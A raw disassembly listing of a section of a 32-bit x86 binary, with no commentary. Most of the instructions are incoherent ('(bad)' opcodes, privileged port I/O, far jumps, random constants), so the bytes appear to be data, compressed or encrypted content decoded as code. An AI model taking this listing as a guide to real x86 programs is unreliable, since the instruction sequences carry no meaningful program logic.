  40ba44:	mov    esi,0x74698bb2
  40ba49:	sbb    BYTE PTR [edx],bh
  40ba4b:	adc    dh,bl
  40ba4d:	fisttp QWORD PTR [ebx]
  40ba4f:	ins    BYTE PTR es:[edi],dx
  40ba50:	lea    eax,[esp+ebx*2]
  40ba53:	ror    ah,0xe0
  40ba56:	pop    eax
  40ba57:	jp     0x40bac0
  40ba59:	jnp    0x40ba18
  40ba5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba5c:	in     eax,dx
  40ba5d:	mov    eax,0x843629c4
  40ba62:	xchg   edi,eax
  40ba63:	add    BYTE PTR [edx],0xac
  40ba66:	outs   dx,BYTE PTR ds:[esi]
  40ba67:	sub    cl,BYTE PTR [ecx+0xad90b59]
  40ba6d:	clc    
  40ba6e:	out    0x10,al
  40ba70:	jnp    0x40ba44
  40ba72:	hlt    
  40ba73:	imul   edi,DWORD PTR [edx-0x67b9b7ac],0x120bb8bc
  40ba7d:	push   0x8c7c0a95
  40ba82:	dec    ecx
  40ba83:	popf   
  40ba84:	arpl   WORD PTR [edx+0x5c4adfb9],cx
  40ba8a:	pop    ds
  40ba8b:	pop    eax
  40ba8c:	dec    esi
  40ba8d:	xor    ah,BYTE PTR [esi]
  40ba8f:	in     eax,dx
  40ba90:	jecxz  0x40badf
  40ba92:	and    al,0xa3
  40ba94:	inc    edi
  40ba95:	cld    
  40ba96:	sub    BYTE PTR [edi+0x2fcee3ec],ah
  40ba9c:	pop    ebp
  40ba9d:	mov    edi,0x22b36e7b
  40baa2:	mov    cl,0x4
  40baa4:	push   esi
  40baa5:	pop    eax
  40baa6:	mov    eax,ds:0x1fb1afa3
  40baab:	dec    eax
  40baac:	mov    edi,0x3ad1bb8f
  40bab1:	mov    edx,0xa42dc3bd
  40bab6:	mov    edx,tr5
  40bab9:	jle    0x40ba9e
  40babb:	pop    eax
  40babc:	or     eax,0x53d6c0d4
  40bac1:	or     edi,DWORD PTR [edx+0x64]
  40bac4:	hlt    
  40bac5:	mov    eax,ds:0xdbc146a1
  40baca:	out    dx,al
  40bacb:	push   ss
  40bacc:	push   edx
  40bacd:	in     al,dx
  40bace:	fucomi st,st(5)
  40bad0:	mov    ebp,ebp
  40bad2:	shl    ebp,cl
  40bad4:	mov    DWORD PTR [edi],ecx
  40bad6:	jmp    DWORD PTR [esp+edi*1-0x70c62740]
  40badd:	clc    
  40bade:	fdivr  DWORD PTR [esi]
  40bae0:	mov    ds:0xe3a0ecee,al
  40bae5:	inc    esp
  40bae6:	jmp    0xaacd:0x68b3a15f
  40baed:	neg    esp
  40baef:	or     BYTE PTR [eax+0x52],dh
  40baf2:	inc    esp
  40baf3:	push   ebp
  40baf4:	and    eax,0xb3fafc01
  40baf9:	pop    edx
  40bafa:	xchg   esi,eax
  40bafb:	fisubr DWORD PTR [ecx]
  40bafd:	sar    BYTE PTR [edi-0x65122395],cl
  40bb03:	shr    BYTE PTR [ebx-0x2fb86297],1
  40bb09:	adc    al,0x42
  40bb0b:	dec    ebx
  40bb0c:	bound  ebx,QWORD PTR [ebp-0xeebecb5]
  40bb12:	(bad)  
  40bb13:	jb     0x40bb78
  40bb15:	shl    DWORD PTR ds:0x1c3f2c15,cl
  40bb1b:	mov    ah,0xf8
  40bb1d:	dec    ebx
  40bb1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb1f:	loop   0x40bab8
  40bb21:	sar    BYTE PTR [ebp+0x16ff81e0],1
  40bb27:	icebp  
  40bb28:	mov    ebp,0x85b9a3e9
  40bb2d:	pop    ebx
  40bb2e:	int3   
  40bb2f:	or     al,0xd5
  40bb31:	jmp    0x40bb80
  40bb33:	cmp    BYTE PTR [eax+0x3c],cl
  40bb36:	jmp    0xcf3aacdb
  40bb3b:	int    0x2e
  40bb3d:	dec    edx
  40bb3e:	push   es
  40bb3f:	fnsave [ecx+esi*2-0x5a]
  40bb43:	push   cs
  40bb44:	add    ch,ah
  40bb46:	leave  
  40bb47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb48:	pop    ecx
  40bb49:	adc    al,ah
  40bb4b:	stos   BYTE PTR es:[edi],al
  40bb4c:	push   ss
  40bb4d:	mov    ebx,0xb04f6e92
  40bb52:	jb     0x40bae7
  40bb54:	ror    BYTE PTR [edx-0x66],cl
  40bb57:	lahf   
  40bb58:	lahf   
  40bb59:	lods   eax,DWORD PTR ds:[esi]
  40bb5a:	sub    al,0x92
  40bb5c:	cmp    edi,eax
  40bb5e:	retf   
  40bb5f:	pop    eax
  40bb60:	pop    esi
  40bb61:	and    al,0xc
  40bb63:	xor    eax,0x1bbb89b9
  40bb68:	dec    ecx
  40bb69:	imul   edi,DWORD PTR ds:0xe903213d,0x42c32e0d
  40bb73:	xchg   BYTE PTR [esi+ebp*2+0x27],ch
  40bb77:	pop    ds
  40bb78:	ret    0xd2d1
  40bb7b:	fsubr  QWORD PTR [esi]
  40bb7d:	inc    ebx
  40bb7e:	mov    bh,0x8f
  40bb80:	mov    esp,DWORD PTR [esi+edi*8+0x6bd1e4ca]
  40bb87:	push   esi
  40bb88:	xchg   esp,eax
  40bb89:	imul   eax,DWORD PTR [edi-0x700d460b],0x64
  40bb90:	js     0x40bb86
  40bb92:	in     al,dx
  40bb93:	arpl   WORD PTR ds:[ebx+0x20383f8a],di
  40bb9a:	sub    DWORD PTR [esi],esp
  40bb9c:	iret   
  40bb9d:	push   ebx
  40bb9e:	loope  0x40bbbb
  40bba0:	inc    edx
  40bba1:	popa   
  40bba2:	xor    al,0x40
  40bba4:	pop    edx
  40bba5:	les    ebp,FWORD PTR [esi-0x15]
  40bba8:	sbb    al,0x8f
  40bbaa:	(bad)  
  40bbab:	jb     0x40bb7d
  40bbad:	xchg   ebx,eax
  40bbae:	mov    ?,WORD PTR [edi+0x66]
  40bbb1:	(bad)  
  40bbb2:	nop
  40bbb3:	ins    BYTE PTR es:[edi],dx
  40bbb4:	xor    edi,DWORD PTR [ecx-0x4b3cf092]
  40bbba:	cmp    al,BYTE PTR [eax]
  40bbbc:	jnp    0x40bbc4
  40bbbe:	icebp  
  40bbbf:	pop    ss
  40bbc0:	pop    esi
  40bbc1:	jecxz  0x40bb4f
  40bbc3:	test   BYTE PTR [edi-0x5],dh
  40bbc6:	xor    ecx,eax
  40bbc8:	data16 test al,cl
  40bbcb:	xchg   esi,eax
  40bbcc:	jnp    0x40bb5b
  40bbce:	loop   0x40bc29
  40bbd0:	in     al,0x64
  40bbd2:	mov    esp,0x9952ab94
  40bbd7:	retf   0x3719
  40bbda:	xchg   dh,bh
  40bbdc:	fmul   st,st(0)
  40bbde:	ret    0x8964
  40bbe1:	pop    edi
  40bbe2:	aad    0x5c
  40bbe4:	retf   
  40bbe5:	in     al,dx
  40bbe6:	out    dx,eax
  40bbe7:	push   ss
  40bbe8:	mov    dh,0xfc
  40bbea:	mov    al,ds:0x692ac1ee
  40bbef:	mov    ah,0x24
  40bbf1:	retf   
  40bbf2:	retf   0xd91f
  40bbf5:	push   ecx
  40bbf6:	sbb    edi,DWORD PTR [ebx+0x44]
  40bbf9:	cli    
  40bbfa:	and    esi,0xffffff8d
  40bbfd:	mov    eax,DWORD PTR [edi+ebx*1-0x43]
  40bc01:	les    edx,FWORD PTR [eax+0x39d4a512]
  40bc07:	xchg   BYTE PTR [ebx-0x1fcea854],ch
  40bc0d:	xor    al,0x3
  40bc0f:	cld    
  40bc10:	shufps xmm0,XMMWORD PTR [esi],0x7f
  40bc14:	retf   
  40bc15:	daa    
  40bc16:	push   esp
  40bc17:	arpl   WORD PTR [eax-0x159244c6],cx
  40bc1d:	repz push 0xffffff9b
  40bc20:	push   es
  40bc21:	frndint 
  40bc23:	cmc    
  40bc24:	retf   0x4b66
  40bc27:	mov    esp,0xd0874756
  40bc2c:	mov    al,ds:0x6293618f
  40bc31:	or     ah,BYTE PTR [edi-0x7b]
  40bc34:	int3   
  40bc35:	test   DWORD PTR [ecx+0x26],esi
  40bc38:	ins    DWORD PTR es:[edi],dx
  40bc39:	sti    
  40bc3a:	xor    al,0x43
  40bc3c:	das    
  40bc3d:	sub    ecx,DWORD PTR [eax+ebx*4-0x347124f9]
  40bc44:	dec    edi
  40bc45:	mov    ds:0xc773a0c5,al
  40bc4a:	aad    0x3
  40bc4c:	ret    
  40bc4d:	mov    gs,WORD PTR [ebx-0x7a]
  40bc50:	jns    0x40bbd2
  40bc52:	out    0xee,eax
  40bc54:	push   esi
  40bc55:	outs   dx,DWORD PTR ds:[esi]
  40bc56:	sbb    DWORD PTR [esp],edx
  40bc59:	es inc esp
  40bc5b:	shr    BYTE PTR [eax+ebp*2+0x22075b58],0x54
  40bc63:	dec    ebp
  40bc64:	out    dx,eax
  40bc65:	jb     0x40bca6
  40bc67:	pop    es
  40bc68:	into   
  40bc69:	outs   dx,DWORD PTR ds:[esi]
  40bc6a:	gs xchg ebx,eax
  40bc6c:	push   edx
  40bc6d:	enter  0x53e,0xa9
  40bc71:	fdivr  QWORD PTR [edx+eax*4-0x7f67177b]
  40bc78:	mov    DWORD PTR [edx+0x146006ae],ecx
  40bc7e:	cmp    al,0x77
  40bc80:	add    DWORD PTR [ecx+0x0],eax
  40bc83:	sar    al,0xd9
  40bc86:	sbb    DWORD PTR [edx-0x6fa6f92],eax
  40bc8c:	dec    eax
  40bc8d:	sar    BYTE PTR [eax+0x2b099efb],1
  40bc93:	bnd jae 0x40bc5c
  40bc96:	addr16 ja 0x40bcbc
  40bc99:	rol    DWORD PTR [eax],cl
  40bc9b:	xchg   ebp,eax
  40bc9c:	cs cs or al,0x1e
  40bca0:	and    al,0xd1
  40bca2:	cmp    esp,edx
  40bca4:	adc    BYTE PTR [edi],0x9a
  40bca7:	and    cl,bh
  40bca9:	inc    esp
  40bcaa:	sub    ebx,edi
  40bcac:	cmp    ebx,edx
  40bcae:	mov    edx,DWORD PTR [ebp-0x38]
  40bcb1:	jbe    0x40bcba
  40bcb7:	mov    edx,DWORD PTR [ebp-0x3c]
  40bcba:	mov    edi,DWORD PTR [ebp-0x4]
  40bcbd:	xor    edi,eax
  40bcbf:	xor    edx,eax
  40bcc1:	jmp    0x40c0d8
  40bcc6:	test   DWORD PTR [ebp-0x48],ecx
  40bcc9:	rol    BYTE PTR [eax-0x33],0x8d
  40bccd:	dec    ebp
  40bcce:	pop    ecx
  40bccf:	repz ror ebx,cl
  40bcd2:	scas   eax,DWORD PTR es:[edi]
  40bcd3:	push   edx
  40bcd4:	push   cs
  40bcd5:	or     ah,ah
  40bcd7:	mov    ?,WORD PTR [esi+0x7e]
  40bcda:	jo     0x40bd55
  40bcdc:	jle    0x40bd5c
  40bcde:	inc    esi
  40bcdf:	ret    0x837d
  40bce2:	push   es
  40bce3:	adc    BYTE PTR ds:0xabae90df,dh
  40bce9:	pop    esi
  40bcea:	fld    DWORD PTR [esp+ebp*4]
  40bced:	adc    ebp,ecx
  40bcef:	push   ebp
  40bcf0:	dec    esp
  40bcf1:	retf   0x8929
  40bcf4:	mov    edi,0xabccd909
  40bcf9:	inc    edx
  40bcfa:	stos   BYTE PTR es:[edi],al
  40bcfb:	adc    DWORD PTR [eax],edx
  40bcfd:	xor    al,0x69
  40bcff:	ret    0x42fd
  40bd02:	and    BYTE PTR [ebx+eax*2-0x559990ee],bh
  40bd09:	add    eax,0xff320134
  40bd0e:	dec    ecx
  40bd0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd10:	push   esp
  40bd11:	mov    eax,ds:0x6d6c670
  40bd16:	pushf  
  40bd17:	and    ecx,DWORD PTR [ecx-0x31bb2f34]
  40bd1d:	imul   edi,DWORD PTR [edi-0x4b],0x522e0a76
  40bd24:	xchg   edx,eax
  40bd25:	(bad)  
  40bd26:	lds    esi,FWORD PTR [eax]
  40bd28:	add    DWORD PTR [ecx+0x8],edx
  40bd2b:	dec    esp
  40bd2c:	or     DWORD PTR [ebx-0x46],esp
  40bd2f:	push   edi
  40bd30:	repnz mov al,BYTE PTR [esi-0x6a]
  40bd34:	cmp    eax,0x7f6c0cac
  40bd39:	jo     0x40bda4
  40bd3b:	sahf   
  40bd3c:	aas    
  40bd3d:	addr16 dec esp
  40bd3f:	xor    al,0x69
  40bd41:	shr    DWORD PTR [ecx+0x20a82fc1],0x33
  40bd48:	sbb    eax,0x9173e2ac
  40bd4d:	stos   DWORD PTR es:[edi],eax
  40bd4e:	add    eax,ecx
  40bd50:	out    0x36,eax
  40bd52:	lahf   
  40bd53:	ins    BYTE PTR es:[edi],dx
  40bd54:	repz cmp BYTE PTR [edi+edi*8],bl
  40bd58:	mov    DWORD PTR ds:0x1112432f,ecx
  40bd5e:	lods   eax,DWORD PTR ds:[esi]
  40bd5f:	mov    DWORD PTR [ebp-0x4c],edi
  40bd62:	shr    DWORD PTR [edx+0x11],1
  40bd65:	mov    cl,0xa0
  40bd67:	mov    ebx,0xcd641870
  40bd6c:	fisub  DWORD PTR [ebp-0x36d1ffe5]
  40bd72:	lods   al,BYTE PTR ds:[esi]
  40bd73:	adc    BYTE PTR [ecx],ch
  40bd75:	sub    DWORD PTR [esp+eax*4],edi
  40bd78:	inc    esi
  40bd79:	jle    0x40bd1e
  40bd7b:	push   0xffffff8a
  40bd7d:	or     BYTE PTR ds:0x7a0c3f,dl
  40bd83:	test   eax,0x205596aa
  40bd88:	cmp    bh,bl
  40bd8a:	rol    DWORD PTR [eax],1
  40bd8c:	data16 add BYTE PTR [ecx],dl
  40bd8f:	bswap  ecx
  40bd91:	hlt    
  40bd92:	jb     0x40bdd7
  40bd94:	shl    DWORD PTR [ecx+0x31530769],0xda
  40bd9b:	mov    ebp,0xa814838d
  40bda0:	or     DWORD PTR [ebx-0x7a],0xbeb82ba4
  40bda7:	dec    ecx
  40bda8:	adc    eax,0xed3484d8
  40bdad:	mov    ebp,DWORD PTR [esi+0xd75121f]
  40bdb3:	ja     0x40bd73
  40bdb5:	ja     0x40bdab
  40bdb7:	fidivr DWORD PTR [ebx]
  40bdb9:	pop    ebx
  40bdba:	lock fld st(4)
  40bdbd:	add    dh,BYTE PTR [ebp+edx*8-0x40349b44]
  40bdc4:	fist   DWORD PTR fs:[esp+ebp*4]
  40bdc8:	stos   BYTE PTR es:[edi],al
  40bdc9:	ret    
  40bdca:	rcr    BYTE PTR ss:[eax],cl
  40bdcd:	xor    al,BYTE PTR [ebp-0x54]
  40bdd0:	arpl   WORD PTR [eax+0x1b388097],dx
  40bdd6:	test   bl,bl
  40bdd8:	call   FWORD PTR [eax]
  40bdda:	dec    edx
  40bddb:	pop    edx
  40bddc:	xchg   ebp,eax
  40bddd:	out    dx,eax
  40bdde:	adc    bh,BYTE PTR [edx]
  40bde0:	or     BYTE PTR [ebx-0xa],0x29
  40bde4:	pop    ecx
  40bde5:	dec    edx
  40bde6:	addr16 ror esp,0xee
  40bdea:	imul   ebp,DWORD PTR ds:0x12666e3c,0xfced8a1b
  40bdf4:	xor    eax,0x51273d1b
  40bdf9:	imul   edx,DWORD PTR [eax],0x15
  40bdfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdfd:	fs push es
  40bdff:	cwde   
  40be00:	xlat   BYTE PTR ds:[ebx]
  40be01:	hlt    
  40be02:	(bad)  
  40be03:	ins    BYTE PTR es:[edi],dx
  40be04:	sahf   
  40be05:	loop   0x40be4c
  40be07:	das    
  40be08:	jge    0x40be15
  40be0a:	jp     0x40be70
  40be0c:	cli    
  40be0d:	jl     0x40bdcc
  40be0f:	fnstenv ds:0xba362dc0
  40be15:	out    dx,eax
  40be16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be17:	add    ebp,DWORD PTR [ebp+0xdd36876]
  40be1d:	adc    eax,0xa8cc4f54
  40be22:	into   
  40be23:	fsubr  QWORD PTR [ebp-0x307027f]
  40be29:	or     BYTE PTR [edx-0x58e4fa22],dh
  40be2f:	pop    ebp
  40be30:	add    edx,DWORD PTR [esp+ebp*2+0x2]
  40be34:	and    al,0x66
  40be36:	adc    DWORD PTR [esi],edi
  40be38:	push   ds
  40be39:	add    eax,0x9196a956
  40be3e:	mov    cl,0x9e
  40be40:	stos   BYTE PTR es:[edi],al
  40be41:	or     ch,ch
  40be43:	dec    edx
  40be44:	dec    edi
  40be45:	push   0x58150e34
  40be4a:	int3   
  40be4b:	das    
  40be4c:	and    esi,ebp
  40be4e:	sbb    DWORD PTR [ebx+esi*8],ecx
  40be51:	enter  0x5f01,0x9
  40be55:	mov    bh,BYTE PTR [edx*2+0x5aa609da]
  40be5c:	lea    ebx,[edx-0x28]
  40be5f:	pushf  
  40be60:	push   edi
  40be61:	(bad)  
  40be62:	test   al,0x73
  40be64:	aam    0x2f
  40be66:	ins    BYTE PTR es:[edi],dx
  40be67:	and    DWORD PTR [eax-0x3254bfb],ebp
  40be6d:	mov    dl,0x3e
  40be6f:	sbb    cl,al
  40be71:	call   DWORD PTR [esi-0x71f51e6e]
  40be77:	scas   eax,DWORD PTR es:[edi]
  40be78:	xor    eax,0x14f3ffe1
  40be7d:	adc    DWORD PTR [eax+0x7a],edi
  40be80:	in     eax,dx
  40be81:	bound  eax,QWORD PTR [eax-0x602932fa]
  40be87:	cld    
  40be88:	mov    ch,0xf1
  40be8a:	ins    DWORD PTR es:[edi],dx
  40be8b:	jb     0x40be3f
  40be8d:	neg    BYTE PTR [edx+ebp*4-0x5d06a556]
  40be94:	imul   edi,DWORD PTR [edi+0x9],0xffffffab
  40be98:	mov    ds:0xc0ea4ce4,eax
  40be9d:	js     0x40be4c
  40be9f:	sahf   
  40bea0:	mov    ds:0xb0fda71f,eax
  40bea5:	mov    WORD PTR ds:0x299844fb,cs
  40beab:	sub    al,0x40
  40bead:	mov    DWORD PTR [eax+ebp*2+0xd],edi
  40beb1:	retf   
  40beb2:	jne    0x40beca
  40beb4:	pop    ebp
  40beb5:	dec    esp
  40beb6:	arpl   WORD PTR [ecx],di
  40beb8:	or     BYTE PTR [eax],ch
  40beba:	sti    
  40bebb:	das    
  40bebc:	pop    esp
  40bebd:	and    DWORD PTR [edi+0x28307cb5],0x39b5e2be
  40bec7:	ret    
  40bec8:	mov    ecx,0xe801801f
  40becd:	scas   eax,DWORD PTR es:[edi]
  40bece:	push   edx
  40becf:	loop   0x40bec6
  40bed1:	repnz cmp BYTE PTR ds:0x3202e25b,bl
  40bed8:	dec    edi
  40bed9:	mov    BYTE PTR [edx-0xd],dh
  40bedc:	ins    BYTE PTR es:[edi],dx
  40bedd:	int    0xe1
  40bedf:	stc    
  40bee0:	and    dl,BYTE PTR [ebx-0x70]
  40bee3:	mov    bl,0x29
  40bee5:	test   eax,0xa08d0fc
  40beea:	xor    al,BYTE PTR [ebp+eiz*2-0x5a5c5f81]
  40bef1:	les    edi,FWORD PTR [eax]
  40bef3:	jp     0x40bf00
  40bef5:	rcl    BYTE PTR [ecx+0x37],cl
  40bef8:	xchg   BYTE PTR [ebp+0x5ab5fe6e],ch
  40befe:	(bad)  
  40beff:	shl    BYTE PTR [edx+ebp*8+0x2cf73377],1
  40bf06:	test   eax,0xa2a7d6cc
  40bf0b:	mov    ds:0xadf8c8,al
  40bf10:	mov    ds:0xa5b2c0a6,al
  40bf15:	xor    eax,0x99af6db9
  40bf1a:	arpl   WORD PTR [ebp-0x63177209],si
  40bf20:	xchg   esp,eax
  40bf21:	sbb    eax,0x77a24ace
  40bf26:	push   ds
  40bf27:	je     0x40bf2b
  40bf29:	mov    bh,0xdf
  40bf2b:	pushf  
  40bf2c:	outs   dx,BYTE PTR ds:[esi]
  40bf2d:	pop    ss
  40bf2e:	and    dl,al
  40bf30:	in     eax,dx
  40bf31:	sub    eax,0x8a98dc05
  40bf36:	(bad)  
  40bf37:	mov    eax,0xa9d8a855
  40bf3c:	sub    DWORD PTR [ecx],edx
  40bf3e:	daa    
  40bf3f:	jmp    0x40bf66
  40bf41:	adc    BYTE PTR [ecx-0x67ca1e42],bl
  40bf47:	mov    edi,0x516445fb
  40bf4c:	mov    cl,BYTE PTR [ecx+0x7472e375]
  40bf52:	rcr    BYTE PTR [ebp+edi*8-0x55],cl
  40bf56:	mov    esp,0xf1930c79
  40bf5b:	pusha  
  40bf5c:	and    DWORD PTR [esi],edi
  40bf5e:	jo     0x40bf21
  40bf60:	push   edx
  40bf61:	fld    DWORD PTR [ebx-0x3125ec8b]
  40bf67:	jb     0x40bf51
  40bf69:	mov    fs,WORD PTR [eax]
  40bf6b:	jno    0x40bf1d
  40bf6d:	imul   esp,DWORD PTR [ebx+edi*1-0x5ccac405],0xcdc70ebc
  40bf78:	push   edx
  40bf79:	scas   al,BYTE PTR es:[edi]
  40bf7a:	je     0x40bfe7
  40bf7c:	ds aaa 
  40bf7e:	ds jo  0x40bfb4
  40bf81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf82:	xor    BYTE PTR ds:0xbd7ce7d9,0x12
  40bf89:	pop    esp
  40bf8a:	fimul  DWORD PTR [esi]
  40bf8c:	out    0xfc,al
  40bf8e:	xor    dl,ch
  40bf90:	pop    esp
  40bf91:	sbb    BYTE PTR [ecx-0x5e],bl
  40bf94:	das    
  40bf95:	imul   ebp,DWORD PTR [eax+ebp*2],0xffffff82
  40bf99:	cld    
  40bf9a:	test   al,0x5e
  40bf9c:	or     DWORD PTR [edx],esi
  40bf9e:	push   esi
  40bf9f:	dec    eax
  40bfa0:	fcmovnu st,st(6)
  40bfa2:	adc    edi,DWORD PTR [eax-0x17e572fe]
  40bfa8:	mov    dh,0xa8
  40bfaa:	call   0xee9ee187
  40bfaf:	inc    esp
  40bfb0:	cmp    dl,BYTE PTR [esp+ebp*1-0x66466621]
  40bfb7:	mov    cl,0x25
  40bfb9:	(bad)  
  40bfba:	nop
  40bfbb:	sbb    BYTE PTR [esi+0x7eb5f2ab],bl
  40bfc1:	mov    esp,0xd2a9aae3
  40bfc6:	sbb    BYTE PTR [eax],bl
  40bfc8:	aaa    
  40bfc9:	mov    esi,0x38bff258
  40bfce:	fs (bad) 
  40bfd0:	mov    bh,0xe7
  40bfd2:	mov    ebp,0xb708085d
  40bfd7:	(bad)  
  40bfd8:	hlt    
  40bfd9:	addr16 test al,0x67
  40bfdc:	xchg   ecx,eax
  40bfdd:	push   esp
  40bfde:	ret    
  40bfdf:	xchg   esi,eax
  40bfe0:	mov    edi,0x137a55c0
  40bfe5:	pop    esi
  40bfe6:	mov    ebx,0xbbac0f8a
  40bfeb:	sub    bh,BYTE PTR [esi+eiz*8+0x55]
  40bfef:	adc    al,0x2b
  40bff1:	imul   ecx,DWORD PTR [ecx-0x6d],0xffffffdf
  40bff5:	bound  esp,QWORD PTR [eax]
  40bff7:	dec    esi
  40bff8:	sar    BYTE PTR [eax],1
  40bffa:	int    0x86
  40bffc:	mov    eax,ds:0x7872cadb
  40c001:	aas    
  40c002:	jl     0x40bfba
  40c004:	adc    al,0x72
  40c006:	clc    
  40c007:	sub    DWORD PTR [eax+ecx*4],esi
  40c00a:	rol    DWORD PTR [edx-0x11],0x99
  40c00e:	inc    ecx
  40c00f:	add    ah,dl
  40c011:	out    dx,al
  40c012:	out    0x0,al
  40c014:	iret   
  40c015:	test   BYTE PTR [esp+eax*1-0x6d79cf92],dh
  40c01c:	mov    ebp,0xe9575912
  40c021:	add    dh,bh
  40c023:	out    dx,al
  40c024:	push   edi
  40c025:	emms   
  40c027:	test   DWORD PTR [ebp+0x66ee1658],eax
  40c02d:	fnstenv [ecx]
  40c02f:	jmp    0xae4e:0x3687c77c
  40c036:	mov    ecx,0x6dcc57a4
  40c03b:	inc    eax
  40c03c:	jb     0x40c0ab
  40c03e:	jmp    0x40bfd5
  40c040:	xchg   edi,eax
  40c041:	jecxz  0x40bfc9
  40c043:	lahf   
  40c044:	and    al,0xfd
  40c046:	push   0xfb099d4e
  40c04b:	push   0xb51da849
  40c050:	pop    es
  40c051:	std    
  40c052:	add    esi,DWORD PTR [edx+ebp*4]
  40c055:	inc    esp
  40c056:	and    DWORD PTR [edi],esi
  40c058:	stos   DWORD PTR es:[edi],eax
  40c059:	xchg   BYTE PTR [edi],cl
  40c05b:	jne    0x40bfe8
  40c05d:	pusha  
  40c05e:	and    al,0x4c
  40c060:	mov    ebp,0x6c5a125a
  40c065:	push   ss
  40c066:	xchg   ebp,eax
  40c067:	inc    ecx
  40c068:	and    ebx,DWORD PTR [edx+0x56e344c5]
  40c06e:	js     0x40c035
  40c070:	out    dx,al
  40c071:	sbb    BYTE PTR [edx-0x21],al
  40c074:	xchg   esp,eax
  40c075:	rcl    DWORD PTR [ebp-0xc],0x90
  40c079:	xor    al,0x6f
  40c07b:	mov    ds:0x1d9eaf7e,al
  40c080:	out    0x3b,eax
  40c082:	jl     0x40c0a9
  40c084:	mov    WORD PTR [edi-0x55],gs
  40c087:	retf   0x2ed5
  40c08a:	out    dx,eax
  40c08b:	cmp    edi,DWORD PTR [ebx+0x1fac0662]
  40c091:	sub    dl,BYTE PTR [edi-0x4]
  40c094:	xchg   ebp,eax
  40c095:	sbb    DWORD PTR [eax+0x64b45fe7],0xffffffbc
  40c09c:	xchg   DWORD PTR [edi-0x3d],esp
  40c09f:	or     ebp,ebp
  40c0a1:	repnz xor eax,0xcaf2d2b7
  40c0a7:	ds cwde 
  40c0a9:	cmp    dl,ch
  40c0ab:	(bad)  
  40c0ac:	stc    
  40c0ad:	mov    ah,0x83
  40c0af:	ds test al,0x55
  40c0b2:	imul   ecx,DWORD PTR [edi-0x28],0xffffffcb
  40c0b6:	cmc    
  40c0b7:	adc    ah,bl
  40c0b9:	jns    0x40c075
  40c0bb:	ins    DWORD PTR es:[edi],dx
  40c0bc:	xchg   edi,eax
  40c0bd:	pop    edi
  40c0be:	sub    ebp,esi
  40c0c0:	lods   al,BYTE PTR ds:[esi]
  40c0c1:	sub    BYTE PTR [edi],dh
  40c0c3:	mov    es,WORD PTR [edx-0x2b79f6e3]
  40c0c9:	fwait
  40c0ca:	sahf   
  40c0cb:	sub    DWORD PTR [esi-0x80],ecx
  40c0ce:	and    ecx,DWORD PTR [eax+0x9e3e6eb]
  40c0d4:	xchg   ebp,eax
  40c0d5:	mov    ds:0xf903eedd,eax
  40c0da:	add    edx,ecx
  40c0dc:	jmp    0x40c4f3
  40c0e1:	cmp    eax,0x7dcf74e8
  40c0e6:	dec    ebx
  40c0e7:	mov    ebp,0xd527fffc
  40c0ec:	sar    cl,1
  40c0ee:	inc    esi
  40c0ef:	ret    
  40c0f0:	pop    edx
  40c0f1:	fimul  WORD PTR [edx+0x79707e7e]
  40c0f7:	jle    0x40c177
  40c0f9:	aad    0x72
  40c0fb:	sub    eax,0x20f9d79b
  40c100:	(bad)  
  40c101:	mul    BYTE PTR [ebx+ebp*1+0x70]
  40c105:	das    
  40c106:	retf   
  40c107:	push   eax
  40c108:	add    DWORD PTR [esi+0x1a],ebp
  40c10b:	mov    ebx,0x80781838
  40c110:	push   0x2f8d3e8d
  40c115:	sbb    BYTE PTR [edx-0x74],bl
  40c118:	ja     0x40c183
  40c11a:	fisttp QWORD PTR [edi]
  40c11c:	mov    edi,0xe1dbba84
  40c121:	and    DWORD PTR [edx-0x43],0x43
  40c125:	dec    edx
  40c126:	test   BYTE PTR [edi+0x586f2a05],bh
  40c12c:	cmp    BYTE PTR [eax-0x232be0e4],al
  40c132:	mov    eax,DWORD PTR [edx-0x199852e9]
  40c138:	xchg   edi,eax
  40c139:	jo     0x40c160
  40c13b:	div    DWORD PTR [ebx-0x24]
  40c13e:	xchg   ecx,eax
  40c13f:	jno    0x40c177
  40c141:	das    
  40c142:	test   BYTE PTR [ebx+0x4],bl
  40c145:	inc    eax
  40c146:	lock mov eax,0x8c544dc2
  40c14c:	adc    edx,DWORD PTR ds:0x7f12eba4
  40c152:	mov    ah,0x26
  40c154:	cs push ebp
  40c156:	xchg   esi,eax
  40c157:	inc    eax
  40c158:	jbe    0x40c0f7
  40c15a:	adc    ah,bh
  40c15c:	dec    eax
  40c15d:	pop    edx
  40c15e:	cli    
  40c15f:	mov    edi,0xc1f29924
  40c164:	and    BYTE PTR [ecx],ah
  40c166:	cmc    
  40c167:	jbe    0x40c17e
  40c169:	cld    
  40c16a:	daa    
  40c16b:	out    dx,al
  40c16c:	add    BYTE PTR [esi],dl
  40c16e:	mov    al,ds:0x6aa1ea96
  40c173:	add    al,0x86
  40c175:	mov    gs,WORD PTR [edx+0x4131c9e0]
  40c17b:	cs and al,0x1d
  40c17e:	jae    0x40c133
  40c180:	xchg   ecx,eax
  40c181:	dec    ebp
  40c182:	div    BYTE PTR [ebx]
  40c184:	adc    eax,0x7bfb1ae8
  40c189:	or     dh,dl
  40c18b:	out    dx,al
  40c18c:	inc    ecx
  40c18d:	lea    ecx,[edi-0x5598890]
  40c193:	dec    edi
  40c194:	pop    ecx
  40c196:	aad    0xe0
  40c198:	mov    al,ds:0x531723e1
  40c19d:	retf   0x8602
  40c1a0:	push   cs
  40c1a1:	add    dl,BYTE PTR [eax+edi*4-0x37cb65e8]
  40c1a8:	fs dec edx
  40c1aa:	(bad)  
  40c1ac:	test   DWORD PTR [eax+0x6a],esi
  40c1af:	in     eax,0x89
  40c1b1:	add    al,0xc3
  40c1b3:	(bad)  
  40c1b4:	mov    ebp,0xc643332
  40c1b9:	push   esp
  40c1ba:	jae    0x40c1f2
  40c1bc:	push   edx
  40c1bd:	scas   al,BYTE PTR es:[edi]
  40c1be:	(bad)  [esi-0x77]
  40c1c1:	out    0x9c,eax
  40c1c3:	scas   eax,DWORD PTR es:[edi]
  40c1c4:	inc    esp
  40c1c5:	mov    ecx,0x6d200aaf
  40c1ca:	stc    
  40c1cb:	stos   DWORD PTR es:[edi],eax
  40c1cc:	loop   0x40c1d3
  40c1ce:	sbb    cl,ah
